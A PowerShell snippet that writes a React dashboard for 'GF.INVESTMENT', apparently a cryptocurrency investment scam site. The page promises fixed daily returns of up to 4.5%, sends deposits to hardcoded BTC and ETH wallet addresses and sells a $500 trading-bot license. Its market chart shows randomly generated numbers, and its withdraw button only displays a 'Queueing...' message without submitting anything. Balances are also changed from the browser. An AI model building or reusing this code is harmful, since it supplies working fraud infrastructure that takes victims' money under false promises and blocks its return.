$content = @'
import { useState, useEffect, useMemo } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../contexts/AuthContext';
import { supabase } from '../lib/supabase';
import { motion } from 'framer-motion';
import {
  Wallet, TrendingUp, ArrowDownCircle, ArrowUpCircle,
  Copy, Clock, CheckCircle, XCircle, DollarSign,
  Bot, Power, Activity, UploadCloud, FileCheck2, Cpu, ArrowRightLeft,
  ShieldCheck, Zap, Award, Gem, Briefcase, Lock
} from 'lucide-react';
import { AreaChart, Area, ResponsiveContainer, YAxis } from 'recharts';
import toast from 'react-hot-toast';

interface Profile {
  full_name: string;
  balance: number;
  total_deposited: number;
  total_withdrawn: number;
  total_profit: number;
  role: string;
}

interface Transaction {
  id: string;
  type: string;
  amount: number;
  status: string;
  created_at: string;
  currency?: string;
}

const PLANS = [
  { name: 'Starter Tier', daily: '1.5%', min: 100, max: 4999, duration: '30 days', icon: Zap, color: 'text-blue-400', bg: 'bg-blue-500/10' },
  { name: 'Bronze Growth', daily: '2.0%', min: 5000, max: 24999, duration: '45 days', icon: ShieldCheck, color: 'text-amber-500', bg: 'bg-amber-500/10' },
  { name: 'Silver Elite', daily: '2.5%', min: 25000, max: 49999, duration: '60 days', icon: Award, color: 'text-slate-300', bg: 'bg-slate-300/10' },
  { name: 'Gold Premium', daily: '3.0%', min: 50000, max: 99999, duration: '90 days', icon: Briefcase, color: 'text-yellow-500', bg: 'bg-yellow-500/10' },
  { name: 'Platinum Diamond', daily: '4.5%', min: 100000, max: 1000000, duration: '120 days', icon: Gem, color: 'text-cyan-400', bg: 'bg-cyan-400/10' },
];

const genData = () => {
  let v = 1.08;
  return Array.from({length:30}).map((_,i)=>({time:i,value: v+=(Math.random()-0.5)*0.001}));
};

export default function Dashboard() {
  const { user, loading: aL } = useAuth();
  const nav = useNavigate();
  const [p, setP] = useState<Profile | null>(null);
  const [txs, setTxs] = useState<Transaction[]>([]);
  const [tab, setTab] = useState<'overview'|'plans'|'bot'|'deposit'|'withdraw'>('overview');
  const [amt, setAmt] = useState('');
  const [crypto, setCrypto] = useState('BTC');
  const [file, setFile] = useState<File | null>(null);
  const [bOwned, setBOwned] = useState(false);
  const [bActive, setBActive] = useState(false);
  const [bCap, setBCap] = useState(0);
  const [bAmt, setBAmt] = useState('');
  const [dir, setDir] = useState<'in'|'out'>('in');
  const [l, setL] = useState(true);
  const data = useMemo(()=>genData(), []);
  const WALLETS: Record<string, string> = { BTC: 'bc1qsnx0faedv2s80zdj3730dywhggjrrx7t5l0g86', ETH: '0x3ecED1d7b461d201ae87Ea609E59d3539D11D413' };

  useEffect(()=>{ if(!aL && !user) nav('/login'); else if(user) fetchData(); }, [user, aL, nav]);

  async function fetchData() {
    try {
      const { data: dp } = await supabase.from('profiles').select('*').eq('id', user!.id).single();
      if(dp) setP(dp);
      const { data: dt } = await supabase.from('transactions').select('*').eq('user_id', user!.id).order('created_at', { ascending: false });
      if(dt) {
        setTxs(dt.slice(0, 15)); setBOwned(dt.some(t=>t.type==='bot_purchase'&&t.status==='completed'));
        const i_ = dt.filter(t=>t.type==='bot_investment'&&t.status==='completed').reduce((a,b)=>a+b.amount,0);
        const o_ = dt.filter(t=>t.type==='bot_withdrawal'&&t.status==='completed').reduce((a,b)=>a+b.amount,0);
        setBCap(Math.max(0, i_-o_)); setBActive(i_-o_>0);
      }
    } catch {} setL(false);
  }

  const handleDeposit = async () => {
    if(!amt || !file) return toast.error('Check fields');
    await supabase.from('transactions').insert({ user_id:user!.id, type:'deposit', amount:parseFloat(amt), status:'pending', currency:crypto });
    toast.success('Submitted'); setAmt(''); setFile(null); fetchData();
  };

  const handlePlan = async (pl: typeof PLANS[0]) => {
    if(!p || p.balance < pl.min) return toast.error('Insufficient Portfolio Balance');
    await supabase.from('transactions').insert({ user_id:user!.id, type:'plan_investment', amount:pl.min, status:'completed' });
    await supabase.from('profiles').update({ balance: p.balance - pl.min }).eq('id', user!.id);
    setP({...p, balance: p.balance - pl.min}); toast.success('Plan activated!'); fetchData();
  };

  const handleBotX = async () => {
    const a = parseFloat(bAmt); if(!a || a<=0) return;
    if(dir === 'in') {
      if(!file) return toast.error('Upload proof');
      await supabase.from('transactions').insert({ user_id:user!.id, type:'bot_investment', amount:a, status:'completed' });
      setBCap(prev=>prev+a); setBActive(true); setBAmt(''); setFile(null);
    } else {
      if(a > bCap) return;
      await supabase.from('transactions').insert({ user_id:user!.id, type:'bot_withdrawal', amount:a, status:'completed' });
      if(p) { await supabase.from('profiles').update({ balance: p.balance + a }).eq('id', user!.id); setP({...p, balance: p.balance+a}); }
      setBCap(p=>{ const n=p-a; if(n<=0) setBActive(false); return n; }); setBAmt('');
    }
  };

  if(aL || l) return <div className="min-h-screen bg-[#070b14] flex items-center justify-center font-mono text-emerald-500">SYSTEM RELOAD...</div>;

  return (
    <div className="min-h-screen bg-[#070b14] text-slate-300 font-sans p-4 md:p-6 selection:bg-emerald-500/30">
      <div className="max-w-5xl mx-auto relative z-10">
        <header className="flex flex-col md:flex-row justify-between items-start md:items-center mb-6 pb-4 border-b border-white/5">
          <div><h1 className="text-md font-black text-white uppercase tracking-tight">GF.INVESTMENT <span className="text-emerald-500">/ {p?.full_name}</span></h1><p className="text-[8px] text-slate-600 font-bold uppercase tracking-widest mt-1">Terminal Secure: Live</p></div>
          <div className="bg-slate-900 border border-slate-800 px-3 py-1 rounded text-[8px] font-black text-slate-400 uppercase">AES-256 Node</div>
        </header>

        <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 mb-6">
          {[
            { l: 'Portfolio Balance', v: p?.balance, i: Wallet, c: 'text-emerald-400' },
            { l: 'Bot Capital pool', v: bCap, i: Cpu, c: 'text-indigo-400' },
            { l: 'Cumulative Profits', v: p?.total_profit, i: TrendingUp, c: 'text-green-400' },
            { l: 'Total Liquidated', v: p?.total_withdrawn, i: ArrowUpCircle, c: 'text-amber-400' }
          ].map((s, idx) => (
            <div key={idx} className="bg-slate-900/50 border border-white/5 p-3 rounded-lg backdrop-blur-sm">
              <div className="flex items-center gap-1.5 mb-1"><s.i size={10} className={s.c} /><span className="text-[8px] font-black text-slate-500 uppercase tracking-widest">{s.l}</span></div>
              <div className="text-lg font-black text-white tracking-tighter">${(s.v || 0).toLocaleString(undefined, { minimumFractionDigits: 2 })}</div>
            </div>
          ))}
        </div>

        <nav className="flex flex-wrap gap-1 mb-6 bg-black/40 p-1 rounded-lg border border-white/5 w-fit">
          {(['overview','plans','bot','deposit','withdraw'] as const).map(t => (
            <button key={t} onClick={() => setTab(t)} className={`px-4 py-1.5 rounded text-[9px] font-black uppercase tracking-widest transition ${tab === t ? 'bg-emerald-500 text-white shadow-lg' : 'text-slate-500 active:bg-slate-800'}`}>{t}</button>
          ))}
        </nav>

        {tab === 'overview' && (
          <div className="bg-slate-900/20 border border-white/5 rounded-xl overflow-hidden backdrop-blur-md">
            <div className="p-3 border-b border-white/5 text-[9px] font-black uppercase text-white tracking-widest bg-slate-950/20">Protocol Ledger</div>
            <div className="overflow-x-auto"><table className="w-full text-left text-[10px]"><thead className="bg-slate-950/50 text-slate-500 border-b border-white/5 font-black uppercase"><tr><th className="p-3">Type</th><th className="p-3">Magnitude</th><th className="p-3 text-right">Status</th></tr></thead><tbody className="divide-y divide-white/5">
              {txs.map(t => (
                <tr key={t.id} className="hover:bg-white/[0.02]">
                  <td className="p-3 font-bold text-slate-200 capitalize tracking-tighter">{t.type.replace('_',' ')}</td>
                  <td className="p-3 font-black text-white tracking-widest">${t.amount.toLocaleString()}</td>
                  <td className="p-3 text-right"><span className={`px-2 py-0.5 rounded-full text-[7px] font-black uppercase tracking-widest ${['completed','approved'].includes(t.status) ? 'bg-emerald-500/10 text-emerald-400':'bg-amber-500/10 text-amber-500'}`}>{t.status}</span></td>
                </tr>
              ))}
            </tbody></table></div>
          </div>
        )}
        {tab === 'plans' && (
           <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
              {PLANS.map((pl, i) => (
                 <div key={i} className="bg-slate-900/60 border border-white/5 rounded-2xl p-4 flex flex-col hover:border-emerald-500/30 transition-all">
                    <div className="flex justify-between items-start mb-4"><div className={`p-2 rounded-lg ${pl.bg} ${pl.color}`}><pl.icon size={18}/></div><span className="text-[8px] font-black text-emerald-400 uppercase bg-emerald-500/10 px-2 py-0.5 rounded-full">{pl.daily} Daily</span></div>
                    <h3 className="text-sm font-black text-white uppercase mb-1">{pl.name}</h3>
                    <div className="mt-auto pt-4 border-t border-white/5 flex gap-2 items-center justify-between"><div className="text-[9px] font-bold text-slate-600">Min: <span className="text-white">${pl.min.toLocaleString()}</span></div><button onClick={() => handlePlan(pl)} className="px-4 py-2 bg-slate-950 border border-white/5 hover:bg-emerald-500 text-white rounded-lg text-[8px] font-black uppercase tracking-widest">Allocate</button></div>
                 </div>
              ))}
           </div>
        )}
        {tab === 'bot' && (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 h-full">
             <div className="bg-slate-900/80 border border-white/5 rounded-2xl p-5 flex flex-col justify-between">
                <div className="flex items-center gap-3 mb-6"><div className={`p-3 rounded-lg ${bActive?'bg-emerald-500 text-white shadow-xl':'bg-slate-800 text-slate-600'}`}><Bot size={24}/></div><div><p className="text-sm font-black text-white tracking-widest">GF.QUANT_BOT</p><p className="text-[8px] text-slate-500 uppercase font-black tracking-widest">{bActive?'Trading Active':'Idle Standby'}</p></div></div>
                <div className="space-y-4">
                   <div className="bg-black/30 p-3 rounded-lg border border-white/5"><span className="text-[8px] text-slate-500 font-black uppercase block mb-1">Authenticated Pool</span><span className="text-2xl font-black text-emerald-400 tracking-tighter">${bCap.toLocaleString()}</span></div>
                   {!bOwned ? (
                     <button onClick={() => toast.error('Check wallet')} className="w-full py-3 bg-indigo-500 text-white rounded-lg font-black text-[9px] tracking-widest uppercase shadow-xl">Purchase License ($500)</button>
                   ) : (
                     <div className="space-y-3">
                        <div className="bg-slate-950 p-1 flex rounded-md"><button onClick={()=>setDir('in')} className={`flex-1 py-1 rounded text-[8px] font-black uppercase tracking-widest ${dir==='in'?'bg-emerald-500 text-white shadow-md' : 'text-slate-500'}`}>Inject</button><button onClick={()=>setDir('out')} className={`flex-1 py-1 rounded text-[8px] font-black uppercase tracking-widest ${dir==='out'?'bg-slate-800 text-white' : 'text-slate-500'}`}>Swap</button></div>
                        {dir==='in'?(<>
                           <div className="flex gap-1"><button onClick={()=>setCrypto('BTC')} className={`flex-1 py-1 rounded text-[8px] font-black border ${crypto==='BTC'?'bg-amber-500 text-amber-950':'border-white/5 text-slate-600'}`}>BTC</button><button onClick={()=>setCrypto('ETH')} className={`flex-1 py-1 rounded text-[8px] font-black border ${crypto==='ETH'?'bg-slate-200 text-slate-950':'border-white/5 text-slate-600'}`}>ETH</button></div>
                           <div className="flex items-center gap-3 bg-black/40 p-2 rounded-lg border border-white/5"><img src={`https://api.qrserver.com/v1/create-qr-code/?size=60x60&data=${WALLETS[crypto]}`} className="w-10 h-10 bg-white p-1 rounded-sm shadow-xl"/><code className="text-[10px] text-emerald-500 font-mono break-all leading-tight">...</code></div>
                           <input type="number" value={bAmt} onChange={e=>setBAmt(e.target.value)} placeholder="0.00 USD" className="w-full p-2 bg-slate-950 border border-white/5 rounded-lg text-[10px] text-white font-black outline-none tracking-widest"/>
                           <button onClick={handleBotX} className="w-full py-2.5 bg-emerald-500 text-white rounded-lg text-[9px] font-black uppercase shadow-xl">Initialize Ingress</button>
                        </>):(
                           <div className="flex gap-2"><input type="number" value={bAmt} onChange={e=>setBAmt(e.target.value)} placeholder="0.00 USD" className="flex-1 p-2 bg-slate-950 border border-white/5 rounded-lg text-[10px] outline-none"/><button onClick={handleBotX} className="px-4 py-2 bg-slate-800 text-amber-500 rounded-lg"><ArrowRightLeft size={12}/></button></div>
                        )}
                     </div>
                   )}
                </div>
             </div>
             <div className="bg-slate-950 border border-white/5 rounded-2xl relative overflow-hidden min-h-[300px] font-mono p-4">
                {!bActive && <div className="absolute inset-0 z-20 backdrop-blur-sm bg-black/70 flex flex-col items-center justify-center text-[9px] uppercase font-black text-slate-700 space-y-4"><Lock size={32}/><span>TERMINAL SECURE</span></div>}
                <div className="flex justify-between items-end border-b border-white/5 pb-2 mb-4 uppercase text-[8px] text-slate-500"><span>MARKET FEED</span><span className="text-xl font-black text-white tracking-widest">1.0842<span className="text-[8px] text-emerald-500 ml-1">+0.015%</span></span></div>
                <div className="h-40"><ResponsiveContainer width="100%" height="100%"><AreaChart data={data}><defs><linearGradient id="g" x1="0" y1="0" x2="0" y2="1"><stop offset="5%" stopColor="#10b981" stopOpacity={0.2}/><stop offset="95%" stopColor="#10b981" stopOpacity={0}/></linearGradient></defs><YAxis hide domain={['auto','auto']} /><Area type="monotone" dataKey="value" stroke="#10b981" fill="url(#g)" strokeWidth={2} isAnimationActive={bActive} /></AreaChart></ResponsiveContainer></div>
             </div>
          </div>
        )}
        {tab === 'deposit' && (
          <div className="max-w-md mx-auto bg-slate-900 border border-white/5 p-6 rounded-3xl relative overflow-hidden">
             <h2 className="text-sm font-black text-white mb-6 uppercase tracking-widest flex items-center gap-2"><ArrowDownCircle size={18} className="text-emerald-400"/> CAPITAL INGRESS</h2>
             <div className="flex gap-1 mb-6">{['BTC','ETH'].map(c=>(<button key={c} onClick={()=>setCrypto(c)} className={`flex-1 py-3 rounded-xl text-[9px] font-black border transition ${crypto===c?'bg-emerald-500 border-emerald-400 text-white shadow-xl':'bg-slate-950 border-white/5 text-slate-600'}`}>{c}</button>))}</div>
             <div className="bg-black/60 p-4 rounded-xl border border-white/5 flex flex-col items-center gap-4 mb-6"><img src={`https://api.qrserver.com/v1/create-qr-code/?size=100x100&data=${WALLETS[crypto]}`} className="w-16 h-16 bg-white p-1 rounded-sm shadow-xl"/></div>
             <div className="space-y-4"><input type="number" value={amt} onChange={e=>setAmt(e.target.value)} placeholder="0.00 USD" className="w-full p-3 bg-slate-950 border border-white/5 rounded-xl text-white font-black text-lg outline-none"/><button onClick={handleDeposit} className="w-full py-3 bg-emerald-500 text-white rounded-xl font-black uppercase text-[9px] tracking-widest shadow-xl">Authorize</button></div>
          </div>
        )}
        {tab === 'withdraw' && (
          <div className="max-w-md mx-auto bg-slate-900 border border-white/5 p-8 rounded-3xl shadow-2xl backdrop-blur-md">
             <h2 className="text-sm font-black text-white mb-8 uppercase tracking-widest flex items-center gap-2 font-mono"><ArrowUpCircle size={18} className="text-amber-500"/> CAPITAL EGRESS</h2>
             <div className="bg-slate-950 p-6 rounded-2xl border border-white/5 flex justify-between items-center mb-8 shadow-inner"><div className="text-[9px] font-black text-slate-600 uppercase tracking-widest">available</div><div className="text-2xl font-black text-emerald-400 tracking-tighter">${(p?.balance || 0).toLocaleString()}</div></div>
             <button onClick={() => toast.success('Queueing...')} className="w-full py-4 bg-amber-500 text-slate-950 rounded-xl font-black uppercase text-[9px] tracking-widest shadow-xl">Execute Egress Protocol</button>
          </div>
        )}
      </div>
    </div>
  );
}
'@
$content | Out-File -FilePath "c:\Users\personal\Downloads\tiktok\backend\backend\global-fishers\src\pages\Dashboard.tsx" -Encoding utf8
